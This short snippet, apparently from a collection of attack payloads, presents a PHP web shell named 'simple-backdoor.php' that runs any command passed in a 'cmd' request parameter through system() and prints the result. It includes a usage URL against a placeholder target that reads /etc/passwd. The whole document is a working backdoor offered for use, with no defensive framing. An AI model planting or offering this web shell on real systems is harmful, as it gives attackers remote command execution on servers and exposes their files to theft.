## PHP
simple-backdoor.php
usage : `http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd`
```
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

